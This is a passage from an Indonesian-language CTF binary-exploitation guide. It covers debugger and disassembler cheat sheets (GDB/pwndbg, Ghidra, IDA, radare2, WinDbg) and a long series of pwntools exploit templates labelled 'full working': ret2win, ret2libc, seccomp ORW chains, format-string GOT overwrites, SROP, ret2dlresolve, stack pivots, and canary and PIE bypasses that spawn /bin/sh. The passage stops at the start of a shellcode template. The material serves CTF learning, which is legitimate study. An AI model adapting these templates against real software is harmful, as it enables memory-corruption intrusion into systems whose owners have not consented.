x/10i $rip    # 10 instruction dari rip
x/s $rdi      # string di alamat rdi
x/4wx $rbp    # 4 word (4-byte) dari rbp, hex
```

### pwndbg-specific Commands

| Command | Fungsi |
|---------|--------|
| `checksec` | Cek mitigasi binary |
| `cyclic 200` | Generate cyclic pattern |
| `cyclic -l 0x61616169` | Cari offset dari nilai |
| `telescope $rsp` | Stack + follow pointer (rapi) |
| `vmmap` | Peta memory virtual |
| `canary` | Lihat TLS canary value |
| `piebase` | Cari base address PIE |
| `libcinfo` | Info libc yang dipake |
| `heap` | Lihat struktur heap |
| `bins` | Lihat semua bin (tcache,fastbin,unsorted,small,large) |
| `tcachebins` | Lihat tcache per size |
| `fastbins` | Lihat fastbin |
| `unsortedbin` | Lihat unsorted bin |
| `smallbins` / `largebins` | Lihat small/large bin |
| `find-fake-fast <addr>` | Cari fake fastbin chunk |
| `try-free <addr>` | Coba free simulasi |
| `arena` | Lihat arena (main_arena) |
| `chunk <addr>` | Detail sebuah chunk |
| `vis-heap-chunks` | Visualisasi heap |

### GDB + Pwntools Workflow

Di pwntools, kamu bisa debug langsung:
```python
io = gdb.debug('./chall', gdbscript='''
b *vuln+42
c
''')
io.sendline(payload)
```

Atau attach ke proses yang udah jalan:
```bash
gdb -p $(pidof chall)
```

### GDB.attach() di pwntools

```python
io = process('./chall')
# Kirim stage 1 dulu
io.sendline(stage1)
# Attach GDB setelah stage 1
gdb.attach(io, gdbscript='''
b *0x401234
c
''')
# Kirim stage 2
io.sendline(stage2)
```

---

## 37C. Tool Cheat Sheet: Ghidra

Ghidra = decompiler gratis dari NSA. Ini tool RE paling populer buat PWN.

### Cara Pake Ghidra (Quick Start)

1. `ghidra` — jalanin GUI
2. File → New Project → Non-Shared Project
3. File → Import File → pilih binary
4. Double click binary → Analysis → Auto-Analyze (Yes)
5. Tunggu analysis selesai (beberapa detik-menit tergantung besar binary)

### Yang Harus Kamu Lakuin di Ghidra

#### 1. Cari Symbol (Window → Symbol Table)
Cari: `main`, `win`, `flag`, `system`, `puts`, `printf`, `gets`, `read`, `malloc`, `free`

#### 2. Cari String (Window → Defined Strings)
Cari: `flag.txt`, `/bin/sh`, menu items, `CTF{`, error messages

#### 3. Navigasi Function (Window → Functions)
Klik function → liat pseudo-code di tengah

#### 4. Xref (Cross-reference)
Klik kanan variable/function → "References → Show References to"
**Ini penting buat tau SIAPA aja yang pake variable/function itu.**

#### 5. Rename Variable
Klik variable → `L` (keyboard) → ganti nama
**Ini bikin pseudo-code lebih gampang dibaca.**

#### 6. Patch Binary (Edit → Patch Instruction)
Kamu bisa ubah instruction langsung di Ghidra
**Kadang dipake buat bypass check di binary challenge.**

### Ghidra Shortcuts Penting

| Shortcut | Fungsi |
|----------|--------|
| `D` | Toggle data/instruction |
| `L` | Rename variable/function |
| `Ctrl+E` | Cari instruction |
| `Ctrl+Shift+F` | Search all (program text) |
| `F` | Follow (masuk ke call) |
| `O` | Back (kembali) |
| `G` | Go to address |
| `K` | Show cross-references |
| `R` | Re-type variable (ganti tipe) |
| `Ctrl+L` | Label (nama function/variable) |
| `F5` | Refresh decompile |
| `M` | Mark bookmark |

### Ghidra Tips PWN

1. **Pertama kali buka** → jangan lupa rename variable yang penting biar gak bingung
2. **Cari buffer overflow** → cari function yang panggil `gets()`, `scanf("%s")`, atau `read()` tanpa batas
3. **Cari format string** → cari `printf(buf)` — argumen ke printf dari user input
4. **Cari heap bug** → cari pola `malloc` → `free` → usage
5. **Ghidra kadang salah** decompile — cek assembly kalo pseudo-code aneh

---

## 37D. Tool Cheat Sheet: IDA

IDA = Interactive Disassembler. Standar industri, tapi berbayar (kecuali IDA Free).

### Layout IDA

- **IDA-View (Graph view)**: Function digambar sebagai flowchart — gampang liat percabangan
- **Text view**: Assembly murni
- **Pseudocode (F5)**: Decompiler output (kalo punya Hex-Rays)
- **Imports tab**: Function yang di-import dari libc
- **Exports tab**: Function yang di-export (biasanya di library)
- **Strings tab (Shift+F12)**: String dalam binary

### IDA Shortcuts Penting

| Shortcut | Fungsi |
|----------|--------|
| `F5` | Pseudocode (Hex-Rays decompiler) |
| `Space` | Toggle graph/text view |
| `N` | Rename variable/function |
| `;` | Add comment |
| `Shift+F12` | Strings window |
| `Ctrl+S` | Segment window (memory map) |
| `G` | Go to address |
| `X` | Cross-reference (xref) |
| `Alt+M` | Mark position |
| `Ctrl+M` | Jump to marked position |
| `Esc` | Back to previous position |
| `C` | Convert to code |
| `D` | Convert to data |
| `A` | Convert to ASCII/string |
| `Ctrl+W` | Save database |

### IDA Tips PWN

1. **Cari function dari imported** → Imports tab → cari `gets`, `system`, dll → klik → liat xref
2. **String: Shift+F12** → cari `/bin/sh`, `flag.txt`, menu items
3. **Graph view**: warna merah = basic block yang kalo diklik langsung exit/crash
4. **Stack frame**: di text view, liat `arg_0`, `arg_8`, `var_4` — itu offset dari rbp
5. **IDA Free**: cuma buat x86/x64, gak ada decompiler

---

## 37E. Tool Cheat Sheet: radare2 (r2)

radare2 = RE framework CLI. Berguna kalo gak punya GUI.

### Cara Mulai

```bash
# Cara termudah
r2 -A ./chall          # open + analisis
r2 -d ./chall          # open + debug mode
```

### r2 Commands Dasar

| Command | Fungsi |
|---------|--------|
| `aaa` | Analisis binary (Auto Analyze All) |
| `afl` | List semua function |
| `afl | grep win` | Cari function win |
| `s main` | Seek (pindah) ke main |
| `pdf` | Print disassembly of function |
| `VV` | Visual graph mode |
| `iz` | List strings |
| `iz ~flag` | Cari string "flag" |
| `iS` | List segments |
| `iI` | Binary info |
| `v` | Visual mode (keluar: `q`) |
| `q` | Quit |

### r2 Debug Mode

```bash
# Mulai debug
r2 -d ./chall
dc               # continue
db 0x401234      # breakpoint
db main          # breakpoint di main
ds               # step into
dso              # step over
dr               # lihat register
dr rax           # lihat rax
dr rax=0x1337    # set rax
dbt              # backtrace
pxq @ rsp        # print hex qword dari rsp
pxq @ rsp, 20    # 20 qword
/v 0x61616161    # cari bytes di memory
w AAAA           # write string
wa jmp 0x401234  # write assembly
```

### r2 Workflow Buat Cari Offset

```bash
# 1. Generate cyclic
> w AAAA... (cyclic manual)
# 2. Run
> dc
# 3. Lihat crash
> dr
# 4. Cari offset pake pattern
> /v 0x61616161
```

### r2 + r2pipe (Pake dari Python)

```bash
pip3 install r2pipe
```

```python
import r2pipe
r2 = r2pipe.open('./chall')
r2.cmd('aaa')
functions = r2.cmd('afl')
print(functions)
```

---

## 37F. Tool Cheat Sheet: WinDbg (Windows Debugging)

Untuk Windows PWN (kalo binary-nya PE/Windows). WinDbg adalah debugger resmi Microsoft.

### WinDbg Commands Dasar

| Command | Fungsi |
|---------|--------|
| `bp main` | Breakpoint di main |
| `bp 0x401000` | Breakpoint di address |
| `bl` | List breakpoints |
| `bc 1` | Clear breakpoint 1 |
| `g` | Continue |
| `t` | Step into (trace) |
| `p` | Step over |
| `r` | Lihat register |
| `r rax=0` | Set register |
| `db <addr>` | Lihat byte (1 byte per kolom) |
| `dw <addr>` | Lihat word (2 byte) |
| `dd <addr>` | Lihat dword (4 byte) |
| `dq <addr>` | Lihat qword (8 byte) |
| `dps <addr>` | Lihat pointer + symbol |
| `k` | Stack backtrace |
| `kb` | Stack + argumen |
| `lm` | List modules |
| `lm m *libc*` | Cari module tertentu |
| `!peb` | Process Environment Block |
| `!teb` | Thread Environment Block |
| `.exr -1` | Exception info |
| `.reload` | Reload symbols |
| `.symfix` | Set symbol path ke Microsoft |
| `!analyze -v` | Analisis crash (otomatis!) |

### WinDbg Tips PWN

Windows punya mitigasi beda:
- **GS** = stack canary (analog)
- **DEP** = NX
- **ASLR** = sama kayak Linux
- **SafeSEH** = proteksi SEH
- **CFG** = Control Flow Guard

---

## 37G. Tool Cheat Sheet: Binary Ninja

Alternatif modern ke IDA. UI lebih bersih, harga lebih murah.

| Shortcut | Fungsi |
|----------|--------|
| `G` | Go to address |
| `N` | Rename |
| `;` | Comment |
| `F5` | Decompile |
| `X` | Cross-reference |
| `Ctrl+F` | Search |
| `Tab` | Toggle graph/linear |
| `Space` | Toggle HLIL/assembly |

Binary Ninja punya **HLIL** (High-Level IL) yang bikin reverse lebih gampang — kode diringkas jadi bentuk yang lebih sederhana dari assembly.

---

## 37H. Tool Cheat Sheet: objdump / readelf / nm / strings

Tool command-line bawaan Linux yang gak perlu install.

### objdump
```bash
objdump -d ./chall                   # Disassembly semua text section
objdump -d ./chall | grep -A 20 "<main>:"  # Disassembly function main
objdump -R ./chall                   # Relocation entries (GOT)
objdump -t ./chall                   # Symbol table
objdump -x ./chall                   # Semua header
objdump -s -j .rodata ./chall        # Dump rodata section
```

### readelf
```bash
readelf -h ./chall                   # ELF header
readelf -l ./chall                   # Program headers (segments)
readelf -s ./chall                   # Symbol table (.symtab)
readelf -r ./chall                   # Relocations (sama kaya objdump -R)
```

### nm
```bash
nm ./chall                           # Symbol table (kalo gak stripped)
nm -an ./chall                       # Semua symbol termasuk dynamic
nm ./chall | grep win                # Cari function win
```

### strings
```bash
strings ./chall                      # Semua printable string
strings -a -t x ./chall              # Dengan offset hex
strings ./libc.so.6 | grep "/bin/sh" # Cari /bin/sh di libc
```

---

```bash
cp chall chall_patched
patchelf --set-interpreter ./ld-linux-x86-64.so.2 chall_patched
patchelf --set-rpath . chall_patched
```

---

## 39. Debugging Playbook

### Command wajib di gdb/pwndbg/gef
- `b *main` — breakpoint di main
- `r` — run
- `c` — continue
- `ni` — next instruction (skip calls)
- `si` — step instruction (masuk ke function)
- `x/20gx $rsp` — lihat stack
- `info reg` — lihat register
- `vmmap` — peta memory
- `telescope` — stack + follow pointers
- `heap` — semua chunk heap
- `bins` — bin state
- `canary` — canary value
- `piebase` — PIE base
- `libcinfo` — info libc

### Breakpoint terbaik
- sebelum input dibaca
- sesudah input ditulis ke buffer
- sebelum return
- sebelum/sesudah `malloc`/`free`
- sebelum `printf(userbuf)`

---

## 40. GDB Strategy per Bug Class

### Stack
- breakpoint sebelum return
- lihat stack layout (`telescope $rsp`)
- konfirmasi offset
- pastikan RIP overwrite benar

### Format string
- breakpoint di `printf`/`vfprintf`
- cek stack argument position

### Heap
- breakpoint di allocate/free path
- lihat chunk before/after corruption
- track freelist/bin behavior

---

## 41. pwndbg / GEF Heap Workflow

### Di pwndbg
- `heap`, `bins`, `tcachebins`, `unsortedbin`, `fastbins`
- `find-fake-fast`, `try-free`

### Di GEF
- `heap chunks`, `heap chunk`, `heap arenas`
- `heap-analysis-helper`

---

## 41A. Corefile Workflow

```python
io = process('./chall')
io.sendline(cyclic(200))
io.wait()   # crash
core = io.corefile
print(f"RIP = {hex(core.rip)}")
offset = cyclic_find(core.rip)
print(f"Offset = {offset}")
```

---

## 42. ret2dlresolve

**Analogi:** Di perpustakaan, ada buku yang gak ada di rak (gak ter-import). Tapi kamu bisa isi formulir peminjaman PALSU yang minta buku itu. Pustakawan (dynamic linker) percaya.

Pakai saat:
- dynamic linker bisa dipaksa resolve symbol yang belum ter-import
- kamu punya area writable untuk fake tables

Pwntools helper:
```python
payload = Ret2dlresolvePayload(exe, symbol='system', args=['/bin/sh'])
```

---

## 43. SROP — Sigreturn-Oriented Programming

**Analogi:** Kamu bikin KTP palsu (SigreturnFrame) yang isinya "Nama: Presiden, Alamat: Istana Negara." Satpam (kernel) percaya.

Templates:
1. Set register syscall ke SYS_sigreturn (15 amd64, 119 i386)
2. Trigger syscall
3. Kernel load fake frame
4. Semua register kamu kontrol

```python
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret

payload  = padding
payload += p64(pop_rax) + p64(constants.SYS_rt_sigreturn)
payload += p64(syscall_ret)
payload += bytes(frame)
```

---

## 44. ret2csu

Khusus amd64 ELF. `__libc_csu_init` punya gadget untuk set rbx, rbp, r12-r15 dan call function pointer.

**Analogi:** Di dapur, ada pisau serbaguna yang bisa buat motong, buka kaleng, dan kupas buah.

Pakai saat `pop rdx` atau register lain sulit dicari.

---

## 45. Shellcode vs ROP vs one_gadget

| Kondisi | Pilihan |
|---------|---------|
| NX off atau bisa mprotect | **Shellcode** |
| Leak mudah, mitigasi standar | **ROP/ret2libc** |
| Constraint pas | **one_gadget** |
| Gadget register miskin | **SROP** |
| Symbol resolution bisa dimanipulasi | **ret2dlresolve** |
| Seccomp halangi shell | **ORW** |

---

## 46. When to Abandon a Path

Tinggalkan jalur saat:
- brute-force besar tanpa leak yang masuk akal
- remote entropy terlalu tinggi
- chain terlalu fragile
- mitigation mismatch
- bug awal bukan primitive yang kamu kira

---

## 47. If This, Then Do That

### Kalau `No PIE`, `No Canary`, `NX off` → ret2win atau shellcode
### Kalau `No PIE`, `NX on` → ret2libc/ROP
### Kalau `PIE on`, `Canary on`, ada format string → format string dulu
### Kalau `Full RELRO` + format string write → jangan target GOT
### Kalau ada `malloc/free/show/edit` → heap challenge
### Kalau `seccomp` aktif → dump filter → ORW
### Kalau remote crash beda → fix libc/ld parity

---

## 48. Challenge Class Playbook

### ret2win
- [ ] offset
- [ ] target func
- [ ] alignment

### ret2libc
- [ ] leak libc
- [ ] pop gadgets
- [ ] `/bin/sh` atau ORW
- [ ] stack alignment

### format string
- [ ] offset
- [ ] leak map
- [ ] write target
- [ ] `%n` granularity

### heap
- [ ] libc version
- [ ] primitive
- [ ] heap leak
- [ ] libc leak
- [ ] target overwrite

### seccomp
- [ ] allowed syscalls
- [ ] ORW possible?
- [ ] `mprotect` possible?

### shellcode
- [ ] executable memory?
- [ ] badchars?
- [ ] architecture?
- [ ] seccomp?

---

## 48A. Template Exploit: ret2win (Full Working)

**Kapan pake:** Ada win function, No PIE, offset RIP udah tau.

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./chall', checksec=False)
context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-h']

HOST = 'host'
PORT = 1337

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript)
    return process([exe.path])

gdbscript = '''
continue
'''

io = start()

# ==== EXPLOIT ====
# Cari offset:
#   1. Kirim cyclic 200
#   2. pwn cyclic -l <nilai RIP>  atau  cyclic_find(core.rip)
OFFSET = 40  # <— GANTI: hasil cyclic_find()

# Cari address win function:
#   nm ./chall | grep win        (kalo ada symbol)
#   atau di Ghidra/IDA cari function
WIN_ADDR = exe.symbols['win']  # <— GANTI: address win function

payload  = b'A' * OFFSET
payload += p64(WIN_ADDR)

io.sendline(payload)
io.interactive()
```

---

## 48B. Template Exploit: ret2libc Stage 1 (Leak + Return to Main)

**Kapan pake:** NX aktif, bisa overflow + leak + main balik.

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)  # <— GANTI: pake libc remote
context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-h']

HOST = 'host'
PORT = 1337

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript)
    return process([exe.path])

gdbscript = '''
continue
'''

io = start()

# ==== OFFSET ====
# Cari offset cyclic sama kaya ret2win
OFFSET = 40  # <— GANTI: hasil cyclic_find()

# ==== GADGET ====
# Cari pake: ROPgadget --binary ./chall | grep "pop rdi"
rop = ROP(exe)
RET = rop.find_gadget(['ret'])[0]           # stack alignment
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]

# ==== STAGE 1: LEAK LIBC ====
# panggil puts(GOT[puts]) → dapet address puts di libc
payload  = b'A' * OFFSET
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(exe.got['puts'])             # arg: alamat GOT[puts]
payload += p64(exe.plt['puts'])             # call puts — print 8 byte
payload += p64(exe.symbols['main'])         # balik ke main

io.sendline(payload)

# ==== PARSE LEAK ====
leaked = io.recvline().strip()
leaked = leaked.ljust(8, b'\x00')
libc.address = u64(leaked) - libc.symbols['puts']
log.success(f"libc base: {hex(libc.address)}")

# ==== Cari string /bin/sh ====
# strings -a -t x ./libc.so.6 | grep "/bin/sh"
BINSH = next(libc.search(b'/bin/sh\x00'))  # <— auto cari dari libc
SYSTEM = libc.symbols['system']

# ==== STAGE 2: system("/bin/sh") ====
payload2  = b'A' * OFFSET
payload2 += p64(RET)
payload2 += p64(POP_RDI)
payload2 += p64(BINSH)
payload2 += p64(SYSTEM)

io.sendline(payload2)
io.interactive()
```

---

## 48C. Template Exploit: ret2libc + ORW (Seccomp bypass)

**Kapan pake:** seccomp aktif, execve diblokir, open/read/write masih boleh.

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.log_level = 'info'

OFFSET = 40  # <— GANTI
HOST, PORT = 'host', 1337

def start():
    if args.REMOTE: return remote(HOST, PORT)
    return process([exe.path]) if not args.GDB else gdb.debug([exe.path])

io = start()

# ==== GADGET ====
rop = ROP(libc)  # pake gadget dari libc (kalo ada libc)
POP_RAX = rop.find_gadget(['pop rax', 'ret'])[0]  # atau cari dari binary
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]
POP_RDX = rop.find_gadget(['pop rdx', 'ret'])[0]
POP_R10 = rop.find_gadget(['pop r10', 'ret'])[0] or POP_RCX  # arg ke-4 syscall pake r10!
RET = rop.find_gadget(['ret'])[0]
SYSCALL = rop.find_gadget(['syscall', 'ret'])[0]  # cari: ROPgadget | grep "syscall ; ret"

# Cari / cari string "flag.txt" di binary atau bikin di .bss
FLAG_STR = 0x404000  # <— GANTI: alamat .bss atau string "flag.txt"

# ==== STAGE 1: LEAK LIBC dulu (sama kaya ret2libc) ====
# ... [sama kaya template 48B] ...

# ==== STAGE 2: ORW CHAIN ====
# SYS_open = 2, SYS_read = 0, SYS_write = 1
payload  = b'A' * OFFSET
# Open flag.txt
payload += p64(POP_RAX) + p64(2)           # SYS_open
payload += p64(POP_RDI) + p64(FLAG_STR)
payload += p64(POP_RSI) + p64(0)           # O_RDONLY
payload += p64(POP_R10) + p64(0)           # mode = 0 (r10! bukan rdx!)
payload += p64(SYSCALL)                     # open — result di rax (fd biasanya 3)

# Read rax(fd) → .bss
payload += p64(POP_RDI) + p64(3)           # fd = 3 (hasil open)
payload += p64(POP_RSI) + p64(FLAG_STR + 0x100)  # buffer
payload += p64(POP_RDX) + p64(0x100)       # size
payload += p64(POP_RAX) + p64(0)           # SYS_read
payload += p64(SYSCALL)

# Write stdout
payload += p64(POP_RDI) + p64(1)           # stdout
payload += p64(POP_RSI) + p64(FLAG_STR + 0x100)
payload += p64(POP_RDX) + p64(0x100)
payload += p64(POP_RAX) + p64(1)           # SYS_write
payload += p64(SYSCALL)

io.sendline(payload)
io.interactive()
```

---

## 48D. Template Exploit: Format String Leak (Leak Semua)

**Kapan pake:** Ada format string `printf(user_input)`.

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./chall', checksec=False)
context.log_level = 'info'

io = process([exe.path])

# ==== CARI OFFSET ====
# Kirim: %p.%p.%p.%p.%p.%p.%p.%p
# atau: AAAA%p.%p.%p.%p.%p.%p.%p.%p  kalo posisi offset beda
# Lihat di posisi berapa "AAAA" (0x41414141) muncul
io.sendline(b'%p.' * 20)
resp = io.recvline()
log.info(f"Stack leak: {resp}")

# Kalo pake pwntools otomatis:
def exec_fmt(payload):
    p = process([exe.path])
    p.sendline(payload)
    return p.recvall()
autofmt = FmtStr(exec_fmt)
OFFSET = autofmt.offset  # <— INI offset yang dipake
log.info(f"Format string offset: {OFFSET}")

# ==== LEAK SPESIFIK ====
# Leak PIE: ambil return address ke binary dari stack
# Leak libc: ambil __libc_start_main_ret dari stack
# Leak canary: cari nilai yang byte pertamanya \x00
# Leak stack: ambil rsp atau rbp

def leak(addr, nbytes=8):
    """Leak address pake format string"""
    # Format: <addr 8 byte> + %<offset>$s
    payload = p64(addr) + f'%{OFFSET}$s'.encode()
    io.sendline(payload)
    data = io.recvuntil(b'}')  # atau sampe karakter tertentu
    return data[8:8+nbytes].ljust(nbytes, b'\x00')

# Contoh leak GOT:
puts_leak = leak(exe.got['puts'])
puts_addr = u64(puts_leak)
log.info(f"puts@libc: {hex(puts_addr)}")
```

---

## 48E. Template Exploit: Format String Write (GOT Overwrite)

**Kapan pake:** Partial RELRO, ada format string write (%n).

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./chall', checksec=False)
context.log_level = 'info'

def exec_fmt(payload):
    p = process([exe.path])
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
OFFSET = autofmt.offset  # <— offset dari format string

io = process([exe.path])

# ==== Write target ====
# GOT overwrite: ganti GOT[puts] dengan system@libc
# Atau kalo gak punya libc leak, overwrite pake one_gadget
TARGET_ADDR = exe.got['puts']   # <— GANTI: target write address
TARGET_VAL = exe.plt['system']  # <— GANTI: nilai yang mau ditulis

# Pake pwntools fmtstr_payload
payload = fmtstr_payload(OFFSET, {TARGET_ADDR: TARGET_VAL})
io.sendline(payload)
io.interactive()
```

---

## 48F. Template Exploit: ret2syscall (Statically Linked)

**Kapan pake:** Static binary, gadget lengkap (pop rax, pop rdi, pop rsi, pop rdx, syscall).

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./chall', checksec=False)
context.log_level = 'info'
context.arch = 'amd64'

OFFSET = 40  # <— GANTI

# Cari gadget pake: ROPgadget --binary ./chall
# Atau langsung dari binary:
rop = ROP(exe)
POP_RAX = rop.find_gadget(['pop rax', 'ret'])[0]
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]
POP_RDX = rop.find_gadget(['pop rdx', 'ret'])[0]
SYSCALL = rop.find_gadget(['syscall', 'ret'])[0]  # atau 'int 0x80' buat 32-bit

# Cari /bin/sh di binary:
# strings -a -t x ./chall | grep "/bin/sh"
BINSH = 0x404000  # <— GANTI: address /bin/sh (atau tulis sendiri ke .bss)

# ==== execve("/bin/sh", NULL, NULL) ====
payload  = b'A' * OFFSET
payload += p64(POP_RAX) + p64(59)       # SYS_execve
payload += p64(POP_RDI) + p64(BINSH)
payload += p64(POP_RSI) + p64(0)
payload += p64(POP_RDX) + p64(0)
payload += p64(SYSCALL)

io.sendline(payload)
io.interactive()
```

---

## 48G. Template Exploit: SROP (Register Control via Signal Frame)

**Kapan pake:** Gadget register minim, tapi ada syscall; ret.

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./chall', checksec=False)
context.log_level = 'info'
context.arch = 'amd64'

OFFSET = 40  # <— GANTI

# Cari gadget:
POP_RAX = 0x401234  # <— GANTI: pop rax; ret
SYSCALL = 0x401234  # <— GANTI: syscall; ret  atau  syscall; nop; ret

# SYS_rt_sigreturn di amd64 = 15 (0xf)
SIGRETURN = 15

# Bikin fake signal frame
frame = SigreturnFrame()
frame.rax = 59               # SYS_execve
frame.rdi = 0x404000          # <— GANTI: address /bin/sh
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0x404800          # <— GANTI: new stack (bss)
frame.rip = SYSCALL           # setelah frame di-load, jalanin syscall

payload  = b'A' * OFFSET
payload += p64(POP_RAX) + p64(SIGRETURN)
payload += p64(SYSCALL)
payload += bytes(frame)       # <— kernel baca frame ini, set semua register

io.sendline(payload)
io.interactive()
```

---

## 48H. Template Exploit: ret2csu (\_\_libc_csu_init gadget)

**Kapan pake:** amd64, binary kecil, gadget pop rdx sulit dicari.

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./chall', checksec=False)
context.log_level = 'info'

OFFSET = 40  # <— GANTI

# Cari gadget __libc_csu_init:
# 1. objdump -d ./chall | grep -A 30 "__libc_csu_init"
# 2. Cari pattern:
#    pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
# 3. Dan:
#    mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]
CSU_POP = 0x401234   # <— GANTI: address pop rbx..r15; ret
CSU_CALL = 0x401234  # <— GANTI: address mov rdx,r14; mov rsi,r13; call [r15+rbx*8]

payload  = b'A' * OFFSET

# Stage 1: panggil function via CSU
# Argumen: rdi=r12, rsi=r13, rdx=r14
# Call: [r15+rbx*8] — kalau rbx=0, tinggal [r15]
payload += p64(CSU_POP)
payload += p64(0)           # rbx = 0 (counter)
payload += p64(1)           # rbp = 1 (setelah call, rbp--; kalo rbp==1, loop selesai)
payload += p64(exe.got['puts'])  # r12 -> edi -> arg1: GOT[puts]
payload += p64(exe.got['puts'])  # r13 -> rsi -> arg2: gak penting buat puts
payload += p64(0)           # r14 -> rdx -> arg3: gak penting buat puts
payload += p64(exe.got['puts'])  # r15: call [r15] = call puts@got? GAK! call [r15+rbx*8]

# Hmm, ini butuh address function pointer di memory. Biasanya pake:
# exe.got['puts'] isinya pointer ke puts di libc, jadi [puts@got] = puts address
# Tapi call [r15+rbx*8] artinya dia baca 8 byte dari addr itu.
# Cari function pointer yang udah ada di binary.

# ==== ALTERNATIF: simpel langsung ret2libc aja ====
# ret2csu rumit. Kalo bisa pake pop rdx biasa, pake aja.

# Cari ulang pake cek:
# rop = ROP(exe)
# print(rop.dump())
```

---

## 48I. Template Exploit: ret2dlresolve

**Kapan pake:** Binary pake PLT, "system" gak di-import tapi bisa dipaksa resolve.

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./chall', checksec=False)
context.log_level = 'info'

OFFSET = 40  # <— GANTI

# Pake pwntools Ret2dlresolvePayload
# Ini bikin fake relocation/symbol/string table otomatis
dlresolve = Ret2dlresolvePayload(exe, symbol='system', args=['/bin/sh'])

rop = ROP(exe)
rop.raw(b'A' * OFFSET)
rop.ret2dlresolve(dlresolve)

io = process([exe.path])
io.sendline(rop.chain())
io.interactive()
```

---

## 48J. Template Exploit: Stack Pivot

**Kapan pake:** Ruang setelah RIP kecil, gak cukup buat ROP chain penuh.

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./chall', checksec=False)
context.log_level = 'info'

OFFSET = 40  # <— GANTI

# ==== PIVOT TARGET ====
# Pilih area buat ROP chain panjang:
# .bss, heap, atau global buffer
PIVOT_ADDR = exe.bss() + 0x100  # <— GANTI: area pivot

# ==== GADGET ====
# leave; ret = mov rsp, rbp; pop rbp; pop rip
# Kalo kita kontrol RBP, rsp pindah ke RBP
# trus leave; ret bikin rsp = rbp, pop rbp, ret
LEAVE_RET = 0x401234  # <— GANTI: cari di binary

# Stage 1: small overflow — kontrol RIP + set RBP
payload  = b'A' * OFFSET
payload += p64(PIVOT_ADDR)    # overwrite saved RBP jadi pivot addr
payload += p64(LEAVE_RET)     # RIP = leave; ret → rsp = pivot_addr

io.send(payload)

# Stage 2: kirim ROP chain penuh ke pivot_addr
# (kalo program baca input lagi)
rop_chain = b''
rop_chain += p64(pop_rdi)     # ROP chain panjang
rop_chain += p64(...)
# ... isi ROP chain sesuai kebutuhan ...

io.send(rop_chain)
io.interactive()
```

---

## 48K. Template Exploit: Canary Bypass (Format String + ret2libc)

**Kapan pake:** Canary aktif, tapi ada format string buat leak canary.

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./chall', checksec=False)
context.log_level = 'info'

OFFSET_BUF = 32   # <— GANTI: offset dari buffer ke canary
OFFSET_CANARY = 7 # <— GANTI: offset format string buat canary di stack

io = process([exe.path])

# ==== STAGE 1: LEAK CANARY ====
# Canary biasanya ada di stack, offset tertentu
# Cari dengan ngirim %<offset>$p
io.sendline(f'%{OFFSET_CANARY}$p'.encode())
canary_str = io.recvline().strip()
if canary_str.startswith(b'0x'):
    canary = int(canary_str, 16)
else:
    canary = int(canary_str, 16)
log.success(f"Canary: {hex(canary)}")

# ==== STAGE 2: LEAK LIBC (kalo perlu) ====
# ... leak libc dengan puts@plt dll ...

# ==== STAGE 3: EXPLOIT ====
payload  = b'A' * OFFSET_BUF
payload += p64(canary)          # canary yg udah di-leak
payload += b'B' * 8             # saved RBP (gak penting)
payload += p64(ret_gadget)      # alignment
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)

io.sendline(payload)
io.interactive()
```

---

## 48L. Template Exploit: PIE Bypass (Format String Leak + ret2libc)

**Kapan pake:** PIE aktif, tapi ada format string buat leak code base.

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./chall', checksec=False)  # readelf -s gak bisa, tapi ELF tetap berguna
context.log_level = 'info'

OFFSET = 40        # <— GANTI: offset buffer
FMT_OFFSET = 6     # <— GANTI: offset format string

io = process([exe.path])

# ==== STAGE 1: LEAK PIE ====
# Leak return address ke binary dari stack
# Biasanya di offset format string tertentu
io.sendline(f'%{FMT_OFFSET}$p'.encode())
leak = io.recvline().strip()
code_leak = int(leak, 16)
log.info(f"Code leak: {hex(code_leak)}")

# Hitung PIE base:
# code_leak - offset_of_that_return_address
# Misal return address itu = main+XXX, kurangi XXX
PIE_OFFSET = 0x1234  # <— GANTI: offset dari leaked address ke base
exe.address = code_leak - PIE_OFFSET
log.success(f"PIE base: {hex(exe.address)}")

# ==== STAGE 2: ret2libc biasa ====
# Sekarang exe.symbols['main'], exe.plt['puts'], exe.got['puts'] udah bener
payload  = b'A' * OFFSET
payload += p64(exe.plt['puts'])  # alamat udah bener karena exe.address di-set
# ... dst ret2libc biasa
```

---

## 48M. Template Exploit: Shellcode Injection (NX Off)

**Kapan pake:** NX off, ada RWX memory, bisa lompat ke shellcode.

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./chall', checksec=False)
context.log_level = 'info'
context.arch = 'amd64'

OFFSET = 40  # <— GANTI

# Generate shellcode
